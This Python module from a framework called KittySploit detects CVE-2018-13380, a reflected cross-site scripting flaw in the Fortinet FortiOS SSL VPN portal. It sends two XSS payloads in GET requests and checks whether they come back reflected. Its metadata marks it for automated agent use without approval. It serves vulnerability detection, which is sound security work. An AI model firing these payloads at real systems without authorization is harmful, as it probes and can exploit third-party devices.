#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fortinet FortiOS 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiOS - Cross-Site Scripting Detection',
        'description': 'Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.7, 5.4.0 to 5.4.12, 5.2 and below versions under SSL VPN web portal are vulnerable to cross-site scripting and allows attacker to execute unauthorized malicious script code via the error or message handling parameters.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'fortios', 'xss', 'fortinet', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html',
            'https://fortiguard.com/advisory/FG-IR-18-383',
            'https://fortiguard.com/advisory/FG-IR-20-230',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-13380',
        ],
        'cve': 'CVE-2018-13380',
    }

    def run(self):
        for path in ('/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B', '/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('<svg/onload=alert(1337)>', '<script>alert(1337)</script>',)
            header_any = ('application/json',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Fortinet FortiOS - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

